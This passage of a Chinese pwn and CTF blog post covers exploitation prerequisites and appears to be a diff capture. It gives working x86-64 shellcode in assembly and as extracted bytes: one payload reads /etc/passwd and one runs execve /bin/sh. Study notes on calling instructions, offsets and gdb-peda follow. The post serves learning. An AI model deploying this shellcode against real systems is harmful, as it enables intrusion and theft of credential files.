</span><br><span class="line">    xor byte [rdi + 11], 0x41 </span><br><span class="line"></span><br><span class="line">    xor rax, rax </span><br><span class="line">    add al, 2 </span><br><span class="line">    xor rsi, rsi  ; set O_RDONLY flag </span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    ; syscall read file </span><br><span class="line">    sub sp, 0xfff </span><br><span class="line">    lea rsi, [rsp] </span><br><span class="line">    mov rdi, rax </span><br><span class="line">    xor rdx, rdx </span><br><span class="line">    mov dx, 0xfff   ; size to read </span><br><span class="line">    xor rax, rax </span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    ; syscall write to stdout </span><br><span class="line">    xor rdi, rdi </span><br><span class="line">    add dil, 1 ; set stdout fd = 1 </span><br><span class="line">    mov rdx, rax </span><br><span class="line">    xor rax, rax </span><br><span class="line">    add al, 1 </span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    ; syscall exit </span><br><span class="line">    xor rax, rax </span><br><span class="line">    add al, 60 </span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">_push_filename: </span><br><span class="line">    call _readfile </span><br><span class="line">    path: db &quot;/etc/passwdA&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f elf64 readfile.asm -o readfile.o </span><br><span class="line">$ for i in $(objdump  -d readfile.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &apos;\x&apos;$i; done; echo </span><br><span class="line">\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x6 </span><br><span class="line">6\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x </span><br><span class="line">0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\ </span><br><span class="line">xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f </span><br><span class="line">\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41</span><br></pre></td></tr></table></figure>
+<p>execve /bin/sh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    xor %esi, %esi</span><br><span class="line">    # /bin//sh</span><br><span class="line">    movabs $0x68732f2f6e69622f, %rbx</span><br><span class="line">    push %rsi</span><br><span class="line">    push %rbx</span><br><span class="line">    push %rsp</span><br><span class="line">    pop %rdi</span><br><span class="line">    pushq $59</span><br><span class="line">    pop %rax</span><br><span class="line">    xor %edx, %edx</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ vim sh.s</span><br><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ as sh.s -o sh.s.o</span><br><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ld sh.s.o -o sh</span><br><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ./sh</span><br><span class="line">$ asd</span><br><span class="line">sh: 1: asd: not found</span><br><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ for i in $(objdump -d sh | grep &quot;^ &quot; | cut -f2); do echo -n &apos;\x&apos;$i; done; echo</span><br><span class="line">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</span><br></pre></td></tr></table></figure>
+<h2 id="retn和leave和call"><a href="#retn和leave和call" class="headerlink" title="retn和leave和call"></a>retn和leave和call</h2><p>retn: </p>
+<blockquote>
+<p>64位: pop rip;  rsp = rsp + 8</p>
+<p>32位: pop eip; esp = esp + 4</p>
+<p>retn N操作：先eip=[esp]，然后esp=esp+4+N</p>
+</blockquote>
+<p>leave:</p>
+<blockquote>
+<p>64位: move rsp rbp; pop rbp               将rbp中的值传给rsp</p>
+<p>32位: move esp ebp; pop ebp             将ebp中的值传给esp</p>
+</blockquote>
+<p>call:</p>
+<blockquote>
+<p>64位: push rip; jump 目的位置</p>
+<p>32位: push eip; jump 目的位置</p>
+</blockquote>
+<h2 id="32位寻找偏移"><a href="#32位寻找偏移" class="headerlink" title="32位寻找偏移"></a>32位寻找偏移</h2><blockquote>
+<p>pattern_create 50</p>
+<p>pattern_offset 字符串</p>
+</blockquote>
+<h2 id="有符号整数比较和无符号整数比较"><a href="#有符号整数比较和无符号整数比较" class="headerlink" title="有符号整数比较和无符号整数比较"></a>有符号整数比较和无符号整数比较</h2><table>
+<thead>
+<tr>
+<th>指令</th>
+<th>含义</th>
+<th>运算符号</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jbe</td>
+<td>unsigned below or equal (lower or same)</td>
+<td>&lt;=</td>
+</tr>
+<tr>
+<td>jae</td>
+<td>unsigned above or equal (higher or same)</td>
+<td>&gt;=</td>
+</tr>
+<tr>
+<td>jb</td>
+<td>unsigned below (lower)</td>
+<td>&lt;</td>
+</tr>
+<tr>
+<td>ja</td>
+<td>unsigned above (higher)</td>
+<td>&gt;</td>
+</tr>
+<tr>
+<td>jle</td>
+<td>signed less or equal</td>
+<td>&lt;=</td>
+</tr>
+<tr>
+<td>jge</td>
+<td>signed greater or equal</td>
+<td>&gt;=</td>
+</tr>
+<tr>
+<td>jl</td>
+<td>signed less than</td>
+<td>&lt;</td>
+</tr>
+<tr>
+<td>jg</td>
+<td>signed greater than</td>
+<td>&gt;</td>
+</tr>
+</tbody>
+</table>
+<p>从上面的表中可以看出，</p>
+<p>对于无符号（unsigned）整数比较，使用的是单词是above或below；<br>对于有符号(signed)整数比较，则使用的单词是greater或less。</p>
+<h2 id="查找argv-0-变量的地址"><a href="#查找argv-0-变量的地址" class="headerlink" title="查找argv[0]变量的地址"></a>查找argv[0]变量的地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find /home</span><br><span class="line">Searching for &apos;/home&apos; in: None ranges</span><br><span class="line">Found 6 results, display max 6 items:</span><br><span class="line">[stack] : 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)</span><br><span class="line">[stack] : 0x7fffffffe8f4 (&quot;/home/tianji/Desktop/pwn/jarvis&quot;)</span><br><span class="line">[stack] : 0x7fffffffeb12 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes&quot;)</span><br><span class="line">[stack] : 0x7fffffffeb48 (&quot;/home/tianji&quot;)</span><br><span class="line">[stack] : 0x7fffffffeee7 (&quot;/home/tianji/.vimpkg/bin&quot;)</span><br><span class="line">[stack] : 0x7fffffffefc8 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)</span><br><span class="line">gdb-peda$ find 0x7fffffffdff6</span><br><span class="line">Searching for &apos;0x7fffffffdff6&apos; in: None ranges</span><br><span class="line">Found 2 results, display max 2 items:</span><br><span class="line">   libc : 0x7ffff7dd0508 --&gt; 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)</span><br><span class="line">[stack] : 0x7fffffffdc68 --&gt; 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)</span><br><span class="line">gdb-peda$ distance $rsp 0x7fffffffdc68</span><br><span class="line">From 0x7fffffffda50 to 0x7fffffffdc68: 536 bytes, 134 dwords</span><br></pre></td></tr></table></figure>
+<p>首先搜索字符串”/home”,第一个地址是真实地址，在搜索指向该地址的指针，该指针也就是我们要找的argv[0]的地址。</p>
+<p>当前$rsp的值就是 存在栈溢出变量的地址</p>
+<h2 id="ubuntu-16-64位默认加载地址"><a href="#ubuntu-16-64位默认加载地址" class="headerlink" title="ubuntu 16  64位默认加载地址"></a>ubuntu 16  64位默认加载地址</h2><p>运行程序，然后查看 /proc/pid/maps</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/29112/">https://www.tiandiwuji.top/posts/29112/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/29112/">June 8th 2018, 9:46:21 am</a>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/54897/" title="linux格式化字符串漏洞">
+                    <div class="nextTitle">linux格式化字符串漏洞</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/5359/" title="sqlmap使用">
+                    <div class="prevTitle">sqlmap使用</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style="top:50vh;">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#调用约定"><span class="toc-number">1.</span> <span class="toc-text">调用约定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查找libc基地址"><span class="toc-number">2.</span> <span class="toc-text">查找libc基地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查找”-bin-sh”的偏移地址"><span class="toc-number">3.</span> <span class="toc-text">查找”/bin/sh”的偏移地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反汇编代码"><span class="toc-number">4.</span> <span class="toc-text">反汇编代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#在可执行文件中找gadget"><span class="toc-number">5.</span> <span class="toc-text">在可执行文件中找gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode编写"><span class="toc-number">6.</span> <span class="toc-text">shellcode编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#retn和leave和call"><span class="toc-number">7.</span> <span class="toc-text">retn和leave和call</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32位寻找偏移"><span class="toc-number">8.</span> <span class="toc-text">32位寻找偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有符号整数比较和无符号整数比较"><span class="toc-number">9.</span> <span class="toc-text">有符号整数比较和无符号整数比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查找argv-0-变量的地址"><span class="toc-number">10.</span> <span class="toc-text">查找argv[0]变量的地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ubuntu-16-64位默认加载地址"><span class="toc-number">11.</span> <span class="toc-text">ubuntu 16  64位默认加载地址</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 40
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href="/posts/39475/">ctfzone-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/13474/">real-world-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/6549/">ISITDTU-CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href="/posts/46785/">巅峰极客ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/posts/5109/">php-命令执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/62555/">RSA学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/28940/">ssti</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span><a class="archive-post-title" href="/posts/45992/">php命令执行函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/09</span><a class="archive-post-title" href="/posts/63527/">ollyice</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/16486/">web安全备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/29914/">ssrf+gopher</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/posts/22546/">googlectf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">proc的作用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/21</span><a class="archive-post-title" href="/posts/32268/">sctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href="/posts/54865/">python多线程和lock和Rlock</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/54897/">linux格式化字符串漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn前置知识</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/50844/">linux命令执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/51203/">LD_PRELOAD</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/17498/">mysql忘记密码/修改密码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span><a class="archive-post-title" href="/posts/26365/">suctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href="/posts/53269/">pwn备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/08</span><a class="archive-post-title" href="/posts/62655/">cbc翻转</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href="/posts/60875/">misc思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/33488/">简单的命令（shell+python）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/15636/">parse_url + curl</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href="/posts/22230/">ddctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href="/posts/65402/">PHP代码审计归纳</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/52452/">xss</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/24854/">url相对路径和绝对路径</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href="/posts/40688/">python3和python2 base64的问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href="/posts/41083/">sql注入大全</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="安全"><span class="iconfont-archer">&#xe60a;</span>安全</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Tianji"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
